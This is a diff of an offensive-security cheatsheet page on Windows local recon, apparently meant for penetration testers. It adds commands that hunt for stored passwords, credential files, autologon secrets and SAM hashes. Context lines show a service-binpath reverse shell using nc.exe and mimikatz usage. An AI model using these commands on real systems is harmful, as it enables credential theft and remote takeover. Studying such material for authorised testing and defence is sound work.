@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2020-01-04T16:29:44 CET">
+<meta name="revised" content="2020-01-25T16:00:29 CET">
 <title>Local Recon and Enumeration :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -80,6 +80,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/open-source-intelligence-osint/general/methodology/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/general/methodology/">
+            Methodology
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/open-source-intelligence-osint/technical-recon/" class="dd-item haschildren
@@ -113,13 +120,6 @@
         <div>
           <a href="/open-source-intelligence-osint/technical-recon/company_meta/">
             Company General Informations
-          </a><i class="fa fa-circle-thin read-icon"></i>
-        </div>
-    </li>
-      <li data-nav-id="/open-source-intelligence-osint/technical-recon/documents_metadata/" class="dd-item">
-        <div>
-          <a href="/open-source-intelligence-osint/technical-recon/documents_metadata/">
-            Public Documents and Metadata
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -207,6 +207,13 @@
         </div>
     </li>
         </ul>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/technical-recon/documents_metadata/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/technical-recon/documents_metadata/">
+            
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
     </li>
         </ul>
     </li>
@@ -334,6 +341,20 @@
         <div>
           <a href="/open-source-intelligence-osint/human-recon/geolocation/">
             Geolocation
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/phone_number/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/phone_number/">
+            Geolocation
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/open-source-intelligence-osint/human-recon/images/" class="dd-item">
+        <div>
+          <a href="/open-source-intelligence-osint/human-recon/images/">
+            Images
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -790,6 +811,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/web-attacks/amazon_web_services/" class="dd-item">
+        <div>
+          <a href="/web-attacks/amazon_web_services/">
+            Amazon Web Services (AWS)
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/network/" class="dd-item haschildren
@@ -1189,6 +1217,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/other-systems/freeipa/" class="dd-item">
+        <div>
+          <a href="/other-systems/freeipa/">
+            FREEIPA
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
       <li data-nav-id="/other-systems/misc/" class="dd-item">
         <div>
           <a href="/other-systems/misc/">
@@ -1419,8 +1454,12 @@
 
 <h3 id="basics">Basics</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">whoami
+whoami /priv
 ipconfig
 <span style="color:#111">type</span> “C:<span style="color:#8045ff">\D</span>ocuments and Settings<span style="color:#8045ff">\A</span>dministrator<span style="color:#8045ff">\D</span>esktop<span style="color:#8045ff">\p</span>roof.txt”
+
+<span style="color:#75715e"># Powershell whoami</span>
+<span style="color:#111">$env</span>:UserName
 
 <span style="color:#111">echo</span> %username%
 <span style="color:#111">echo</span> %path%
@@ -1464,16 +1503,50 @@ net users
 net localgroup administrators
 net accounts
 <span style="color:#111">set</span>
-DRIVERQUERY</code></pre></div>
+DRIVERQUERY</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># OS Arch</span>
+systeminfo
+wmic qfe
+
+<span style="color:#75715e"># Envionment variables ? DC on the logon server ?</span> 
+cmd : <span style="color:#111">set</span>
+ps : Get-ChildItem Env: <span style="color:#111">|</span> ft Key,Value
+
+<span style="color:#75715e"># Other connecte drives ?</span>
+cmd :
+net use
+wmic logicaldisk get caption,description,providername
+ps : Get-PSDrive <span style="color:#111">|</span> where <span style="color:#f92672">{</span><span style="color:#111">$_</span>.Provider -like <span style="color:#d88200">&#34;Microsoft.PowerShell.Core\FileSystem&#34;</span><span style="color:#f92672">}</span><span style="color:#111">|</span> ft Name,Root</code></pre></div>
 <p><br/></p>
 
 <h3 id="enumeration-network">Enumeration - Network</h3>
-<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ipconfig /all
-netstat -ano
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># NIC Connected</span>
+ipconfig /all
+powershell&gt; Get-NetIPConfiguration <span style="color:#111">|</span> ft InterfaceAlias,InterfaceDescription,IPv4Address
+powershell&gt; Get-DnsClientServerAddress -AddressFamily IPv4 <span style="color:#111">|</span> ft
+
+<span style="color:#75715e"># Routes</span>
 route print
+powershell&gt; Get-NetRoute -AddressFamily IPv4 <span style="color:#111">|</span> ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+
+<span style="color:#75715e"># ARP Cache</span>
+arp -a
+powershell&gt; Get-NetNeighbor -AddressFamily IPv4 <span style="color:#111">|</span> ft ifIndex,IPAddress,LinkLayerAddress,State
+
+<span style="color:#75715e"># Connection to other hosts</span>
+netstat -ano
+
+<span style="color:#75715e"># Hosts file</span>
+C:<span style="color:#8045ff">\W</span>INDOWS<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\d</span>rivers<span style="color:#8045ff">\e</span>tc<span style="color:#8045ff">\h</span>osts
+
+<span style="color:#75715e"># Firewall</span>
 netsh firewall show state
 netsh firewall show config
-arp -A</code></pre></div>
+netsh advfirewall firewall show rule <span style="color:#111">name</span><span style="color:#f92672">=</span>all
+netsh advfirewall <span style="color:#111">export</span> <span style="color:#d88200">&#34;firewall.txt&#34;</span>
+
+<span style="color:#75715e"># Is SNMP configured ?</span>
+reg query HKLM<span style="color:#8045ff">\S</span>YSTEM<span style="color:#8045ff">\C</span>urrentControlSet<span style="color:#8045ff">\S</span>ervices<span style="color:#8045ff">\S</span>NMP /s
+powershell&gt; Get-ChildItem -path HKLM:<span style="color:#8045ff">\S</span>YSTEM<span style="color:#8045ff">\C</span>urrentControlSet<span style="color:#8045ff">\S</span>ervices<span style="color:#8045ff">\S</span>NMP -Recurse</code></pre></div>
 <p><br/></p>
 
 <h3 id="enumeration-users-groups">Enumeration - Users &amp; Groups</h3>
@@ -1482,6 +1555,20 @@ dir /b /ad “C:<span style="color:#8045ff">\D</span>ocuments and Settings”
 reg query “HKLM<span style="color:#8045ff">\S</span>OFTWARE<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows NT<span style="color:#8045ff">\C</span>urrentversion<span style="color:#8045ff">\W</span>inlogon” <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span> findstr “DefaultUserName DefaultDomainName DefaultPassword”
 net user alice
 <span style="color:#111">echo</span> %username%
+
+<span style="color:#75715e"># Get all users (old users?)</span>
+net users
+dir /b /ad <span style="color:#d88200">&#34;C:\Users\&#34;
+</span><span style="color:#d88200">dir /b /ad &#34;</span>C:<span style="color:#8045ff">\D</span>ocuments and Settings<span style="color:#8045ff">\&#34;</span> <span style="color:#75715e"># Windows XP and below</span>
+powershell&gt; Get-LocalUser <span style="color:#111">|</span> ft Name,Enabled,LastLogon
+powershell&gt; Get-ChildItem C:<span style="color:#8045ff">\U</span>sers -Force <span style="color:#111">|</span> <span style="color:#00a8c8">select</span> Name
+
+<span style="color:#75715e"># Logged on users</span>
+qwinsta
+
+<span style="color:#75715e"># Groups</span>
+powershell&gt; Get-LocalGroup <span style="color:#111">|</span> ft Name
+powershell&gt; Get-LocalGroupMember Administrators <span style="color:#111">|</span> ft Name, PrincipalSource
 
 <span style="color:#75715e"># Get domain</span>
 powershell&gt; wmic computersystem get domain
@@ -1527,7 +1614,18 @@ foreach<span style="color:#f92672">(</span><span style="color:#111">$result</spa
         <span style="color:#111">$SPN</span>       
     <span style="color:#f92672">}</span>
     Write-host <span style="color:#d88200">&#34;&#34;</span>
-<span style="color:#f92672">}</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># WMIC help</span>
+<span style="color:#f92672">}</span>
+
+<span style="color:#75715e"># Registry for user autologon ?</span>
+reg query <span style="color:#d88200">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span> <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;DefaultUserName DefaultDomainName DefaultPassword&#34;</span>
+powershell&gt; Get-ItemProperty -Path <span style="color:#d88200">&#39;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#39;</span> <span style="color:#111">|</span> <span style="color:#00a8c8">select</span> <span style="color:#d88200">&#34;Default*&#34;</span>
+
+<span style="color:#75715e"># Credential Manager ?</span> 
+cmdkey /list
+dir C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\u</span>sername<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\L</span>ocal<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\C</span>redentials<span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>dir C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\u</span>sername<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\R</span>oaming<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\C</span>redentials<span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>powershell&gt; Get-ChildItem -Hidden C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\u</span>sername<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\L</span>ocal<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\C</span>redentials<span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>powershell&gt; Get-ChildItem -Hidden C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\u</span>sername<span style="color:#8045ff">\A</span>ppData<span style="color:#8045ff">\R</span>oaming<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\C</span>redentials<span style="color:#960050;background-color:#1e0010">\</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># WMIC help</span>
 wmic /?
 
 <span style="color:#75715e"># patchlevel</span>
@@ -1550,7 +1648,7 @@ Drives<span style="color:#8045ff">\D</span>rives.xml
 DataSources<span style="color:#8045ff">\D</span>ataSources.xml</code></pre></div>
 <p><br/></p>
 
-<h3 id="enumeration-running-processes">Enumeration - Running Processes</h3>
+<h3 id="enumeration-programs-processes-and-services">Enumeration - Programs, Processes and Services</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tasklist /SVC
 schtasks /query /fo LIST /v
 net start
@@ -1560,13 +1658,120 @@ sc qc upnphost
 sc config upnphost <span style="color:#111">binpath</span><span style="color:#f92672">=</span> “C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\T</span>emp<span style="color:#8045ff">\n</span>c.exe -nv <span style="color:#ae81ff">10</span>.11.0.179 <span style="color:#ae81ff">51337</span> -e C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>md.exe”
 sc config upnphost <span style="color:#111">obj</span><span style="color:#f92672">=</span> “.<span style="color:#8045ff">\L</span>ocalSystem” <span style="color:#111">password</span><span style="color:#f92672">=</span> “”
 net stop upnphost
-net start upnphost</code></pre></div>
+net start upnphost</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Get installed software</span>
+dir /a <span style="color:#d88200">&#34;C:\Program Files&#34;</span>
+dir /a <span style="color:#d88200">&#34;C:\Program Files (x86)&#34;</span>
+reg query HKEY_LOCAL_MACHINE<span style="color:#8045ff">\S</span>OFTWARE
+powershell&gt; Get-ChildItem <span style="color:#d88200">&#39;C:\Program Files&#39;</span>, <span style="color:#d88200">&#39;C:\Program Files (x86)&#39;</span> <span style="color:#111">|</span> ft Parent,Name,LastWriteTime
+powershell&gt; Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE<span style="color:#8045ff">\S</span>OFTWARE <span style="color:#111">|</span> ft Name
+
+<span style="color:#75715e"># Full permissions for everyone or users ?</span>
+icacls <span style="color:#d88200">&#34;C:\Program Files\*&#34;</span> <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;(F)&#34;</span> <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;Everyone&#34;</span>
+icacls <span style="color:#d88200">&#34;C:\Program Files (x86)\*&#34;</span> <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;(F)&#34;</span> <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;Everyone&#34;</span>
+icacls <span style="color:#d88200">&#34;C:\Program Files\*&#34;</span> <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;(F)&#34;</span> <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;BUILTIN\Users&#34;</span>
+icacls <span style="color:#d88200">&#34;C:\Program Files (x86)\*&#34;</span> <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;(F)&#34;</span> <span style="color:#111">|</span> findstr <span style="color:#d88200">&#34;BUILTIN\Users&#34;</span>
+
+<span style="color:#75715e"># Also possible to do it using accesschk from sysinternals</span>
+accesschk.exe -qwsu <span style="color:#d88200">&#34;Everyone&#34;</span> *
+accesschk.exe -qwsu <span style="color:#d88200">&#34;Authenticated Users&#34;</span> *
+accesschk.exe -qwsu <span style="color:#d88200">&#34;Users&#34;</span> *</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Get processes and services</span>
+tasklist /svc
+tasklist /v
+net start
+sc query
+
+powershell&gt; Get-Process <span style="color:#111">|</span> where <span style="color:#f92672">{</span><span style="color:#111">$_</span>.ProcessName -notlike <span style="color:#d88200">&#34;svchost*&#34;</span><span style="color:#f92672">}</span> <span style="color:#111">|</span> ft ProcessName, Id
+powershell&gt; Get-Service
+powershell&gt; Get-WmiObject -Query <span style="color:#d88200">&#34;Select * from Win32_Process&#34;</span> <span style="color:#111">|</span> where <span style="color:#f92672">{</span><span style="color:#111">$_</span>.Name -notlike <span style="color:#d88200">&#34;svchost*&#34;</span><span style="color:#f92672">}</span> <span style="color:#111">|</span> Select Name, Handle, @<span style="color:#f92672">{</span><span style="color:#111">Label</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;Owner&#34;</span><span style="color:#111">;</span><span style="color:#111">Expression</span><span style="color:#f92672">={</span><span style="color:#111">$_</span>.GetOwner<span style="color:#f92672">()</span>.User<span style="color:#f92672">}}</span> <span style="color:#111">|</span> ft -AutoSize
+
+<span style="color:#75715e"># Weak and reocnfigurable services ?</span>
+accesschk.exe -uwcqv <span style="color:#d88200">&#34;Everyone&#34;</span> *
+accesschk.exe -uwcqv <span style="color:#d88200">&#34;Authenticated Users&#34;</span> *
+accesschk.exe -uwcqv <span style="color:#d88200">&#34;Users&#34;</span> *
+
+<span style="color:#75715e"># Service list, many output</span>
+wmic service list
+<span style="color:#00a8c8">for</span> /f <span style="color:#d88200">&#34;tokens=2 delims=&#39;=&#39;&#34;</span> %a in <span style="color:#f92672">(</span><span style="color:#d88200">&#39;wmic service list full^|find /i &#34;pathname&#34;^|find /i /v &#34;system32&#34;&#39;</span><span style="color:#f92672">)</span> <span style="color:#00a8c8">do</span> @echo %a &gt;&gt; c:<span style="color:#8045ff">\w</span>indows<span style="color:#8045ff">\t</span>emp<span style="color:#8045ff">\p</span>ermissions.txt
+<span style="color:#00a8c8">for</span> /f eol^<span style="color:#f92672">=</span>^<span style="color:#d88200">&#34;^ delims^=^&#34;</span> %a in <span style="color:#f92672">(</span>c:<span style="color:#8045ff">\w</span>indows<span style="color:#8045ff">\t</span>emp<span style="color:#8045ff">\p</span>ermissions.txt<span style="color:#f92672">)</span> <span style="color:#00a8c8">do</span> cmd.exe /c icacls <span style="color:#d88200">&#34;%a&#34;</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># ANy Unquoted Service paths ?</span> 
+wmic service get name,displayname,pathname,startmode <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span>findstr /i <span style="color:#d88200">&#34;Auto&#34;</span> <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;C:\Windows\\&#34;</span> <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span>findstr /i /v <span style="color:#d88200">&#34;&#34;&#34;
+</span><span style="color:#d88200">powershell&gt; gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {</span><span style="color:#111">$_</span><span style="color:#d88200">.StartMode -eq &#34;</span>Auto<span style="color:#d88200">&#34; -and </span><span style="color:#111">$_</span><span style="color:#d88200">.PathName -notlike &#34;</span>C:<span style="color:#8045ff">\W</span>indows*<span style="color:#d88200">&#34; -and </span><span style="color:#111">$_</span><span style="color:#d88200">.PathName -notlike &#39;&#34;</span>*<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">}</span> <span style="color:#111">|</span> <span style="color:#00a8c8">select</span> PathName,DisplayName,Name</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Scheduled Tasks</span>
+schtasks /query /fo LIST <span style="color:#ae81ff">2</span>&gt;nul <span style="color:#111">|</span> findstr TaskName
+dir C:<span style="color:#8045ff">\w</span>indows<span style="color:#8045ff">\t</span>asks
+powershell&gt; Get-ScheduledTask <span style="color:#111">|</span> where <span style="color:#f92672">{</span><span style="color:#111">$_</span>.TaskPath -notlike <span style="color:#d88200">&#34;\Microsoft*&#34;</span><span style="color:#f92672">}</span> <span style="color:#111">|</span> ft TaskName,TaskPath,State</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Startup</span>
+wmic startup get caption,command
+reg query HKLM<span style="color:#8045ff">\S</span>oftware<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\C</span>urrentVersion<span style="color:#8045ff">\R</span>un
+reg query HKLM<span style="color:#8045ff">\S</span>oftware<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\C</span>urrentVersion<span style="color:#8045ff">\R</span>unOnce
+reg query HKCU<span style="color:#8045ff">\S</span>oftware<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\C</span>urrentVersion<span style="color:#8045ff">\R</span>un
+reg query HKCU<span style="color:#8045ff">\S</span>oftware<span style="color:#8045ff">\M</span>icrosoft<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\C</span>urrentVersion<span style="color:#8045ff">\R</span>unOnce
+dir <span style="color:#d88200">&#34;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&#34;</span>
+dir <span style="color:#d88200">&#34;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&#34;</span>
+
+powershell&gt; Get-CimInstance Win32_StartupCommand <span style="color:#111">|</span> <span style="color:#00a8c8">select</span> Name, command, Location, User <span style="color:#111">|</span> fl
+powershell&gt; Get-ItemProperty -Path <span style="color:#d88200">&#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span>
+powershell&gt; Get-ItemProperty -Path <span style="color:#d88200">&#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;</span>
+powershell&gt; Get-ItemProperty -Path <span style="color:#d88200">&#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span>
+powershell&gt; Get-ItemProperty -Path <span style="color:#d88200">&#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;</span>
+powershell&gt; Get-ChildItem <span style="color:#d88200">&#34;C:\Users\All Users\Start Menu\Programs\Startup&#34;</span>
+powershell&gt; Get-ChildItem <span style="color:#d88200">&#34;C:\Users\$env:USERNAME\Start Menu\Programs\Startup&#34;</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Dump process memory from PowerShell</span>
+<span style="color:#75715e"># Powershell procdump</span>
+https://gist.github.com/jlawhon/faac02887526746aff468436dc54043d</code></pre></div>
 <p><br/></p>
 
 <h3 id="enumeration-files">Enumeration - Files</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dir /a /s *pass* <span style="color:#f92672">==</span> *cred* <span style="color:#f92672">==</span> *vnc* <span style="color:#f92672">==</span> *.config* <span style="color:#f92672">==</span> *proof.txt* <span style="color:#f92672">==</span> *local.txt*
 findstr /si password *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs <span style="color:#ae81ff">2</span>&gt;nul
-<span style="color:#111">type</span> “C:<span style="color:#8045ff">\D</span>ocuments and Settings<span style="color:#8045ff">\A</span>dministrator<span style="color:#8045ff">\D</span>esktop<span style="color:#8045ff">\p</span>roof.txt”</code></pre></div>
+<span style="color:#111">type</span> “C:<span style="color:#8045ff">\D</span>ocuments and Settings<span style="color:#8045ff">\A</span>dministrator<span style="color:#8045ff">\D</span>esktop<span style="color:#8045ff">\p</span>roof.txt”</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Passwords in the registry</span>
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s 
+
+<span style="color:#75715e"># Unattended files or sysprep not cleaned ?</span>
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt <span style="color:#ae81ff">2</span>&gt;nul
+powershell&gt; Get-Childitem –Path C:<span style="color:#8045ff">\ </span>-Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue <span style="color:#111">|</span> where <span style="color:#f92672">{(</span><span style="color:#111">$_</span>.Name -like <span style="color:#d88200">&#34;*.xml&#34;</span> -or <span style="color:#111">$_</span>.Name -like <span style="color:#d88200">&#34;*.txt&#34;</span> -or <span style="color:#111">$_</span>.Name -like <span style="color:#d88200">&#34;*.ini&#34;</span><span style="color:#f92672">)}</span>
+
+<span style="color:#75715e"># On IIS, what&#39;s in inetpub, web.config ?</span>
+dir /a C:<span style="color:#8045ff">\i</span>netpub<span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>dir /s web.config
+C:<span style="color:#8045ff">\W</span>indows<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\i</span>netsrv<span style="color:#8045ff">\c</span>onfig<span style="color:#8045ff">\a</span>pplicationHost.config
+powershell&gt; Get-Childitem –Path C:<span style="color:#8045ff">\i</span>netpub<span style="color:#8045ff">\ </span>-Include web.config -File -Recurse -ErrorAction SilentlyContinue
+
+<span style="color:#75715e"># IIS logs</span>
+C:<span style="color:#8045ff">\i</span>netpub<span style="color:#8045ff">\l</span>ogs<span style="color:#8045ff">\L</span>ogFiles<span style="color:#8045ff">\W</span>3SVC1<span style="color:#8045ff">\u</span>_ex<span style="color:#f92672">[</span>YYMMDD<span style="color:#f92672">]</span>.log
+C:<span style="color:#8045ff">\i</span>netpub<span style="color:#8045ff">\l</span>ogs<span style="color:#8045ff">\L</span>ogFiles<span style="color:#8045ff">\W</span>3SVC2<span style="color:#8045ff">\u</span>_ex<span style="color:#f92672">[</span>YYMMDD<span style="color:#f92672">]</span>.log
+C:<span style="color:#8045ff">\i</span>netpub<span style="color:#8045ff">\l</span>ogs<span style="color:#8045ff">\L</span>ogFiles<span style="color:#8045ff">\F</span>TPSVC1<span style="color:#8045ff">\u</span>_ex<span style="color:#f92672">[</span>YYMMDD<span style="color:#f92672">]</span>.log
+C:<span style="color:#8045ff">\i</span>netpub<span style="color:#8045ff">\l</span>ogs<span style="color:#8045ff">\L</span>ogFiles<span style="color:#8045ff">\F</span>TPSVC2<span style="color:#8045ff">\u</span>_ex<span style="color:#f92672">[</span>YYMMDD<span style="color:#f92672">]</span>.log
+
+<span style="color:#75715e"># XAMPP, Apache, or PHP, configuration files ?</span> 
+dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
+powershell&gt; Get-Childitem –Path C:<span style="color:#8045ff">\ </span>-Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
+
+<span style="color:#75715e"># Interesting files ?</span> 
+dir /s *pass* <span style="color:#f92672">==</span> *vnc* <span style="color:#f92672">==</span> *.config* <span style="color:#ae81ff">2</span>&gt;nul
+powershell&gt; Get-Childitem –Path C:<span style="color:#8045ff">\U</span>sers<span style="color:#8045ff">\ </span>-Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
+
+<span style="color:#75715e"># Files containing password ?</span>
+findstr /si password *.xml *.ini *.txt *.config <span style="color:#ae81ff">2</span>&gt;nul
+powershell&gt; Get-ChildItem C:<span style="color:#8045ff">\*</span> -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue <span style="color:#111">|</span> Select-String -Pattern <span style="color:#d88200">&#34;password&#34;</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Group Policy Preference</span>
+<span style="color:#75715e"># Output environment-variables</span>
+<span style="color:#111">set</span>
+
+<span style="color:#75715e"># Look for the following:</span>
+<span style="color:#111">LOGONSERVER</span><span style="color:#f92672">=</span><span style="color:#8045ff">\\</span>NAMEOFSERVER
+<span style="color:#111">USERDNSDOMAIN</span><span style="color:#f92672">=</span>WHATEVER.LOCAL
+
+<span style="color:#75715e"># Look up ip-addres</span>
+nslookup nameofserver.whatever.local
+
+<span style="color:#75715e"># It will output something like this</span>
+Address:  <span style="color:#ae81ff">192</span>.168.1.101
+
+<span style="color:#75715e"># Now we mount it</span>
+net use z: <span style="color:#8045ff">\\</span><span style="color:#ae81ff">192</span>.168.1.101<span style="color:#8045ff">\S</span>YSVOL
+
+<span style="color:#75715e"># And enter it</span>
+z:
+
+<span style="color:#75715e"># Now we search for the groups.xml file</span>
+dir Groups.xml /s</code></pre></div>
 <p><br/></p>
 
 <h3 id="gathering-passwords-hashes">Gathering Passwords/Hashes</h3>
@@ -1574,7 +1779,35 @@ findstr /si password *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.
 .<span style="color:#8045ff">\m</span>imikatz.exe
     privilege::debug
     privilege::backup
-    token::elevate</code></pre></div>
+    token::elevate</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># SAM and SYSTEM files</span>
+%SYSTEMROOT%<span style="color:#8045ff">\r</span>epair<span style="color:#8045ff">\S</span>AM
+%SYSTEMROOT%<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>onfig<span style="color:#8045ff">\R</span>egBack<span style="color:#8045ff">\S</span>AM
+%SYSTEMROOT%<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>onfig<span style="color:#8045ff">\S</span>AM
+%SYSTEMROOT%<span style="color:#8045ff">\r</span>epair<span style="color:#8045ff">\s</span>ystem
+%SYSTEMROOT%<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>onfig<span style="color:#8045ff">\S</span>YSTEM
